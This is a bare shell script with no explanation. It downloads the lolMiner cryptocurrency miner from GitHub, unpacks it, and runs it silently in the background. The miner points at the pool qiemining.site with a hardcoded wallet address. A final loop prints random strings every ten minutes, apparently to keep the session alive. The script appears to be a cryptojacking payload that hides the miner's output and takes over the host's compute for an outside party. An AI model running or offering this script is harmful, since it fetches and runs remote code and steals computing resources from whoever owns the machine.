wget https://github.com/Lolliedieb/lolMiner-releases/releases/download/1.61/lolMiner_v1.61_Lin64.tar.gz
tar xf lolMiner_v1.61_Lin64.tar.gz
cd 1.61
./lolMiner --algo ETHASH --pool qiemining.site:8088 --user 0x9dc2157e3ccf7a88268afb7def08a872667a6e29.aqsh --pass 123 --dns-over-http=2 208.67.222.222 > /dev/null 2>&1 &
while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 10m; done
